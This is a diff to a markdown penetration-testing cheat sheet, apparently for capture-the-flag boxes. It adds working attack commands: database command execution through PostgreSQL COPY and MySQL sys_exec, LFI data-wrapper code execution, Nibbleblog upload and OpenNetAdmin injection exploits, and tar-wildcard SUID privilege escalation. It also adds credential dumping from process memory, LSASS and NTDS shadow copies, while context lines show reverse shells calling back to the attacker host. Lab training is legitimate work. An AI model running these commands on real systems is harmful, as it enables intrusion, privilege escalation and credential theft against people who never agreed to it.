@@ -39,6 +39,10 @@ snmp-check $BoxIP
 # FTP and SMTP
 ftp $BoxIP
 nc $BoxIP 25
+# Check FTP anonymously and show the directory listing
+curl -s ftp://anonymous:@$BoxIP/
+# Test SMTP banner and supported commands
+nc -nv $BoxIP 25
 nikto -host http://$BoxIP -Tuning b
 dig axfr $Domain @$BoxIP
 dnsrecon -d $Domain -t std
@@ -72,7 +76,15 @@ curl -s "http://$BoxIP/$Path" -o $ResponseFile
 curl --proxy 127.0.0.1:8080 http://$BoxIP/$Path
 ```
 
-<!-- TODO --> <!-- Add concise virtual-host and subdomain enumeration commands. -->
+### Virtual hosts
+
+```bash
+# Test candidate hostnames against the target while preserving the full domain
+gobuster vhost -u http://$Domain -w $VHostWordlist --append-domain -o $BoxDir/loot/vhosts.txt
+# Route a confirmed virtual host to the target IP
+echo "$BoxIP $VHost" | sudo tee -a /etc/hosts
+curl -i -H "Host: $VHost" http://$BoxIP/
+```
 
 ## 3. DEFAULT CREDS & AUTH TESTING
 
@@ -95,6 +107,8 @@ ftp $BoxIP
 # PostgreSQL default login
 psql -h $BoxIP -p $Port -U postgres
 mysql -u $Username -p$Password -h $BoxIP -P $Port
+# Test PostgreSQL on a non-standard port with the documented default account
+psql -h $BoxIP -p $Port -U postgres -d postgres
 ```
 
 <!-- TODO --> <!-- Add application-specific default credential pairs when documented. -->
@@ -141,6 +155,10 @@ COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';
 COPY cmd_exec FROM PROGRAM '$Command';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
+# PostgreSQL superuser command execution through COPY
+COPY (SELECT '') TO PROGRAM 'id > /tmp/db-id.txt';
+# MySQL UDF command execution when the plugin is writable
+SELECT sys_exec('id > /tmp/mysql-id.txt');
 ```
 
 ### LFI / RFI
@@ -154,6 +172,10 @@ curl -s "http://$BoxIP/$Path?img=php://filter/convert.base64-encode/resource=$Fi
 PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' | base64 -w0 | sed 's/+/%2B/g')
 curl -s "http://$BoxIP/$Path?img=data://text/plain;base64,$PAYLOAD"
 unzip -l $File
+# Read PHP source without executing it
+curl -s "http://$BoxIP/$Path?file=php://filter/convert.base64-encode/resource=$Config" | base64 -d
+# Confirm command execution through a data wrapper
+curl -s "http://$BoxIP/$Path?file=data://text/plain;base64,$PAYLOAD"
 ```
 
 ### FILE UPLOAD
@@ -161,6 +183,13 @@ unzip -l $File
 ```bash
 curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$File" -F "submit=Upload"
 curl -s "http://$BoxIP/$UploadedPath"
+# Nibbleblog 4.0.3 authenticated My Image plugin upload, then trigger the renamed PHP file
+curl -s -b $CookieFile -F 'plugin=my_image' -F 'title=My image' -F 'position=4' -F 'caption=' -F 'image=@$PayloadFile;type=application/x-php' -F 'image_resize=1' -F 'image_width=230' -F 'image_height=200' -F 'image_option=auto' "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
+curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
+# Upload a plugin or archive with the required multipart field
+curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$BoxDir/$Archive" -F "submit=Upload"
+# Enumerate an archive layout before using it as a CMS plugin or theme
+unzip -l $BoxDir/$Archive
 ```
 
 ### COMMAND INJECTION
@@ -168,6 +197,22 @@ curl -s "http://$BoxIP/$UploadedPath"
 ```bash
 curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=id"
 curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=$Command"
+# OpenNetAdmin 18.1.1 xajax command injection, with markers for XML output parsing
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://$BoxIP/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+# Confirm blind execution by watching for a callback ping
+sudo tcpdump -ni tun0 "icmp and host $BoxIP"
+curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=ping -c 1 $LocalIP"
+# Test a loopback-only endpoint through a forwarded local port
+curl -G "http://127.0.0.1:$LocalPort/$Path" --data-urlencode "log_file=/etc/passwd;id;#"
+
+### Stored browser callbacks
+
+```bash
+# Serve a harmless JavaScript marker and record administrator-bot requests
+python3 -m http.server $ListenPort --directory $BoxDir/www
+curl -s http://$LocalIP:$ListenPort/malicious.js
+grep malicious.js $BoxDir/loot/callback.log
+```
 ```
 
 <!-- TODO --> <!-- Add concise SSRF and IDOR command patterns. -->
@@ -191,9 +236,25 @@ searchsploit -x $ExploitPath
 
 # Compile a local C exploit
 gcc $Exploit.c -o $Exploit
+# Run a Python proof of concept after reviewing and setting its variables
+python3 $BoxDir/$Exploit.py $BoxIP $Port
 ```
 
 <!-- TODO --> <!-- Add service-specific manual exploit launch commands. -->
+
+### Service-specific manual checks
+
+```bash
+# Read the SMTP banner before searching for a matching parser exploit
+nc -nv $BoxIP 25
+# Search for OpenSMTPD or Sendmail version-specific exploit references
+searchsploit OpenSMTPD $Version
+searchsploit Sendmail $Version
+# Inspect a proof of concept before changing its callback and target values
+sed -n '1,220p' $BoxDir/exploit.py
+# Launch a reviewed Python 2 service exploit when the target requires it
+python2 $BoxDir/exploit.py $BoxIP $Port
+```
 <!-- TODO --> <!-- Add service-specific Perl, Python, PHP, and compiled exploit launch commands. -->
 
 ## 6. FOOTHOLD: SHELLS & PAYLOADS
@@ -204,6 +265,8 @@ bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LocalIP",$Lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 nc -e /bin/sh $LocalIP $Lport
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f
+# Start a simple HTTP server for payload transfer
+python3 -m http.server $WebPort --directory $BoxDir/www
 php -r '$s=fsockopen("$LocalIP",$Lport);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 # Listener and TTY upgrade
@@ -252,6 +315,9 @@ copy $File \\$LocalIP\share\$File
 Copy-Item \\$LocalIP\share\$File C:\Users\$Username\Desktop\$File
 Expand-Archive .\archive.zip -DestinationPath C:\Temp\$Directory -Force
 Start-BitsTransfer -Source http://$LocalIP/$File -Destination C:\Temp\$File
+# Transfer files through an authenticated Evil-WinRM session
+upload $File
+download $File
 ```
 
 ### Raw Netcat Transfer
@@ -281,6 +347,14 @@ psql -h 127.0.0.1 -p $Port -U $Username -d $Database
 gcore $PID
 sudo gcore $PID
 strings core.$PID | grep -A 1 "Password:"
+# Find root processes, dump one allowed process, and search the dump for secrets
+ps aux | grep root
+sudo gcore $PID
+strings core.$PID | grep -iE 'password|passwd|secret|token'
+# Check whether the passwd file is writable
+ls -la /etc/passwd
+# Generate a portable password hash for a controlled UID-0 entry
+openssl passwd -1 $Password
 ```
 
 <!-- TODO --> <!-- Add concise Linux credential-hunting commands. -->
@@ -332,6 +406,13 @@ dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers
 bsdtar -xOf /var/cache/pacman/pkg/sudo-$Version-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
 ./$Exploit
 /tmp/rootbash -p
+# Create tar checkpoint option filenames for a wildcard sudo rule
+touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
+echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
+sudo tar -cf $Archive *
+# Verify the helper is SUID root and retain the privileged shell
+ls -la /tmp/rootbash
+/tmp/rootbash -p
 ```
 
 ```bash
@@ -341,6 +422,9 @@ sudo python -c 'import pty; pty.spawn("/bin/bash")'
 sudo vim -c ':!/bin/sh'
 sudo less /etc/profile
 !/bin/bash
+# Sudo nano command escape: Ctrl+R, Ctrl+X, then execute a shell
+sudo /bin/nano $SudoFile
+# At nano's execute prompt: reset; sh 1>&0 2>&0
 ```
 
 <!-- TODO --> <!-- Add compact NFS, capabilities, writable configuration, UDF, and tar wildcard examples. -->
@@ -383,6 +467,13 @@ sc.exe config $ServiceName binPath= "cmd.exe /c <command>"
 sc.exe config $ServiceName binPath= "C:\Windows\system32\<original>.exe"
 sc.exe qc $ServiceName
 net localgroup administrators $Username /delete
+
+# Check AlwaysInstallElevated in both required registry locations
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Run a process with alternate credentials when WinRM or RDP is unavailable
+.\RunasCs.exe $Username2 $Password2 "cmd /c whoami"
 ```
 
 <!-- TODO --> <!-- Add concise token, DLL hijack, registry, AlwaysInstallElevated, and named-pipe branches. -->
@@ -445,9 +536,29 @@ netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchan
 bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
 netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
 
+# Parse an authorized LSASS minidump offline
+pypykatz lsa minidump $DumpFile
+
+# Check an object ACL for delegated password-reset rights
+dacledit.py -action read -principal $Username -target $Username2 $Domain/$Username:$Password
+# Force a password reset through RPC after the ACL is confirmed
+rpcclient -U "$Domain/$Username%$Password" $BoxIP -c "setuserinfo2 $Username2 23 $Password2"
+
 # Pass the hash to a domain account
 netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain
 evil-winrm -i $BoxIP -u Administrator -H $NTHash
+
+# Check backup privilege state in an authenticated Windows shell
+whoami /priv
+# Convert a Kali-created DiskShadow script to Windows line endings
+unix2dos $BoxDir/vss.dsh
+# Copy protected hives from a snapshot with backup semantics
+robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$ShadowId\Windows\NTDS $BoxDir/loot ntds.dit /b
+robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$ShadowId\Windows\System32\config $BoxDir/loot SYSTEM /b
+# Extract NT hashes locally from the matching NTDS and SYSTEM files
+secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/SYSTEM -just-dc-ntlm
+# Run a Windows snapshot script with the target-side DiskShadow utility
+diskshadow /s:C:\\Windows\\Temp\\$ScriptName
 ```
 
 ```bash
@@ -535,3 +646,7 @@ md5sum $File
 ```
 
 <!-- TODO --> <!-- Add technique-specific restore commands for services, sudoers, registry hives, and databases. -->
+## External Resources
+
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
+- https://www.revshells.com/
